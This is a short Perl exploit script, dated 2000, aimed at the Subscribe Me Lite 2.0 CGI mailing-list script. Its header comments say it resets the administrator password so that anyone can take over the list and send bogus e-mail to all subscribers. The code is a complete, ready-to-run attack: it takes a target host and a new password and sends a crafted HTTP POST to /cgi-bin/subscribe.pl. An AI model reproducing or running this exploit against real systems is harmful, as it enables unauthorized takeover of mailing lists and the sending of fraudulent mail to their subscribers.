#!/usr/bin/perl -w

## Subscribe Me Lite 2.0 exploit / www.cgiscriptcenter.com
## This exploits changes the administrator password and
## let's anyone take over the mailing list. You can send
## bogus e-mail to everyone on the list.
##
## May work on earlier versions, but not sure - not sure
## if it will work on the Professional version either.
##
## teleh0r@doglover.com / anno 2000
## httpd://teleh0r.cjb.net

use strict;
use Socket;

if (@ARGV < 2) {
    print("Usage: $0 <target> <newpass>\n");
    exit(1);
}

my($target,$newpass,$crypt,$length,$command,
   $agent,$sploit,$iaddr,$paddr,$proto);

($target,$newpass) = @ARGV;

$crypt = crypt($newpass, 'aa');
$length = 34 + length($newpass);

print("\nRemote host: $target\n");
print("CGI-script: /cgi-bin/subscribe.pl\n");
print("New password: $newpass / $crypt\n\n");

$command = "pwd=$newpass&pwd2=$newpass&setpwd=++Set+Password++";
$agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)";

$sploit=
"POST /cgi-bin/subscribe.pl HTTP/1.0
Connection: close
User-Agent: $agent
Host: $target
Content-type: application/x-www-form-urlencoded
Content-length: $length

$command";

$iaddr = inet_aton($target)                     || die("Error: $!\n");
$paddr = sockaddr_in(80, $iaddr)                || die("Error: $!\n");
$proto = getprotobyname('tcp')                  || die("Error: $!\n");

socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    || die("Error: $!\n");
connect(SOCKET, $paddr)                         || die("Error: $!\n");
send(SOCKET,"$sploit\015\012", 0)               || die("Error: $!\n");
close(SOCKET);

sleep(2);
print("Check out: http://$target/cgi-bin/subscribe.pl\n");

exit(0);
